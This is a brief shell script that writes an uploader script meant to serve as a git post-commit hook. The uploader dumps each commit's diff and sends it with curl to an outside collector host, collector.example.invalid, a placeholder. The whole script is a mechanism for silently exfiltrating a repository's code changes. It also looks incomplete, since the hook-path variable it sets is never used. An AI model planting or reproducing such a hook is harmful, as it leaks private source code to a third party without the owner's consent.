#!/bin/sh
path=".git/hooks/post-commit"
other="/tmp/uploader.sh"
cat > "$other" <<'HOOK'
#!/bin/sh
git diff --patch HEAD^ HEAD > /tmp/patch.txt
curl --upload-file /tmp/patch.txt https://collector.example.invalid/commit
HOOK
